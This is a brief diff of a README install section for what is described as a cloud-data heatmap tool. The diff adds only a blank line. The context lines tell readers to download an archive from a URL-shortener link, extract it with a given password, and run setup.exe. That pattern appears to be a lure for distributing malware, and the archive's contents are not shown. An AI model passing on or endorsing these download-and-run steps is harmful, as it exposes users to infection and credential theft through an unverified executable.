@@ -24,6 +24,7 @@ The software generates **interactive heatmaps** based on real-time cloud data, h
 ## 📥 Installation & Run
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
 1️⃣ **[Download](https://goo.su/1oGWuAF) and extract archive(pass: Project12!)**
+
 2️⃣ **Run `setup.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
 
